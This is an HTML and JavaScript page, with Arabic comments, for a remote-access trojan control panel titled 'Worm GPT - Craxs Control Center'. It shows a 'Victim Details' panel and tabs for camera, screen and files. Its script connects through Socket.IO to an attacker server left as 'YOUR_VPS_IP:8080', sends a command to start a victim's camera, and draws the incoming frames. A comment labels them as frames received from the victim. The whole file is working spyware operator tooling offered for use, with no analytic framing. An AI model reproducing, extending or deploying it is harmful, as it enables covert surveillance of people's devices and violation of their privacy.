<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Worm GPT - Craxs Control Center</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --red: #ff0000; --dark: #050505; --card: #0a0a0a; }
        body { background: var(--dark); color: white; font-family: sans-serif; margin: 0; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 70px; height: 100vh; background: #000; position: fixed; right: 0; border-left: 1px solid #111; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
        .sidebar i { color: var(--red); font-size: 22px; margin-bottom: 25px; cursor: pointer; opacity: 0.7; }
        .sidebar i:hover { opacity: 1; transform: scale(1.1); }

        /* Top Nav */
        .top-nav { margin-right: 70px; height: 50px; background: #080808; border-bottom: 1px solid #111; display: flex; justify-content: center; align-items: center; gap: 30px; }
        .nav-item { color: var(--red); font-size: 11px; text-align: center; cursor: pointer; }

        /* Main Content */
        .content { margin-right: 70px; padding: 20px; }
        .map-bg { width: 100%; height: 250px; background: url('https://i.imgur.com/vHqY7yX.png') no-repeat center; background-size: contain; opacity: 0.2; margin-bottom: 20px; }
        
        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
        .stat-card { background: var(--card); border: 1px solid #1a1a1a; padding: 15px; border-radius: 3px; }
        .stat-card h4 { color: var(--red); margin: 0 0 10px; font-size: 13px; text-transform: uppercase; border-bottom: 1px solid #151515; }
        
        /* Popup Styles */
        .modal { display: none; position: fixed; z-index: 1000; right: 80px; top: 60px; width: 500px; background: #000; border: 1px solid var(--red); box-shadow: 0 0 20px rgba(255,0,0,0.2); }
        .modal-header { background: #111; padding: 10px; display: flex; justify-content: space-between; border-bottom: 1px solid #222; }
        .video-box { width: 100%; height: 350px; background: #000; display: flex; align-items: center; justify-content: center; }
        #liveCanvas { width: 100%; height: 100%; object-fit: cover; }
        
        .btn-action { background: var(--red); color: white; border: none; padding: 8px 15px; cursor: pointer; margin-top: 10px; font-weight: bold; width: 100%; }
        .status-on { color: #00ff00; text-shadow: 0 0 5px #00ff00; }
    </style>
</head>
<body>

    <div class="sidebar">
        <i class="fas fa-ghost"></i>
        <i class="fas fa-mobile-alt"></i>
        <i class="fas fa-terminal"></i>
        <i class="fas fa-cog"></i>
    </div>

    <div class="top-nav">
        <div class="nav-item"><i class="fas fa-home"></i><br>Control</div>
        <div class="nav-item"><i class="fas fa-video" onclick="openCam()"></i><br>Camera</div>
        <div class="nav-item"><i class="fas fa-desktop"></i><br>Screen</div>
        <div class="nav-item"><i class="fas fa-folder-open"></i><br>Files</div>
    </div>

    <div class="content">
        <div class="map-bg"></div>
        <div class="stats-grid">
            <div class="stat-card">
                <h4>Information</h4>
                <p>Status: <span class="status-on" id="status">Disconnected</span></p>
                <p>Port: 8080</p>
            </div>
            <div class="stat-card">
                <h4>Victim Details</h4>
                <p id="v-name">Device: None</p>
                <p id="v-ip">IP: 0.0.0.0</p>
            </div>
            <div class="stat-card">
                <h4>Traffic</h4>
                <p>Sent: 0 KB</p>
                <p>Received: 0 KB</p>
            </div>
            <div class="stat-card">
                <h4>Quick Action</h4>
                <button class="btn-action" onclick="openCam()">فتح البث المباشر 😈</button>
            </div>
        </div>
    </div>

    <div id="camModal" class="modal">
        <div class="modal-header">
            <span>LIVE VIDEO FEED</span>
            <span style="cursor:pointer; color:red" onclick="closeCam()">X</span>
        </div>
        <div class="video-box">
            <canvas id="liveCanvas"></canvas>
            <div id="loader">Waiting for stream...</div>
        </div>
    </div>

    <script>
        const socket = io('http://YOUR_VPS_IP:8080'); // ضع IP السيرفر هنا
        const canvas = document.getElementById('liveCanvas');
        const ctx = canvas.getContext('2d');

        socket.on('connect', () => {
            document.getElementById('status').innerText = "Connected";
        });

        function openCam() {
            document.getElementById('camModal').style.display = 'block';
            socket.emit('admin_command', { command: 'start_camera' });
        }

        function closeCam() {
            document.getElementById('camModal').style.display = 'none';
            socket.emit('admin_command', { command: 'stop_camera' });
        }

        // استقبال الفريمات من الضحية
        socket.on('display_frame', (data) => {
            document.getElementById('loader').style.display = 'none';
            const img = new Image();
            img.onload = function() {
                ctx.drawImage(this, 0, 0, canvas.width, canvas.height);
            };
            img.src = "data:image/jpeg;base64," + data.frame;
        });

        socket.on('new_victim_alert', (data) => {
            document.getElementById('v-name').innerText = "Device: " + data.model;
            document.getElementById('v-ip').innerText = "ID: " + data.id;
        });
    </script>
</body>
</html>
